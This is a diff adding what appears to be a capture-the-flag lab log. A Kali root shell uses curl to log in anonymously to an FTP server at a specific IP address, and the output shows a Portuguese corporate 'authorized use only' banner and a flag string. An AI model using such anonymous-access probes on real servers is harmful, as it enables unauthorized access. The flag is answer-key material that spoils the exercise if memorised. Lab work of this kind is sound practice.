@@ -1,0 +1,16 @@
+┌──(root㉿kali)-[/]
+└─# curl ftp://anonymous:anonymous@98.95.207.28/ftp/welcome.txt
+===================================
+  TechCorp Solutions - FTP Server
+===================================
+
+Bem-vindo ao servidor FTP corporativo!
+
+Este servidor é usado para compartilhamento
+interno de arquivos da empresa.
+
+ATENÇÃO: Apenas para uso autorizado!
+
+===================================
+
+FLAG{ftp_4n0nym0us_4cc3ss}
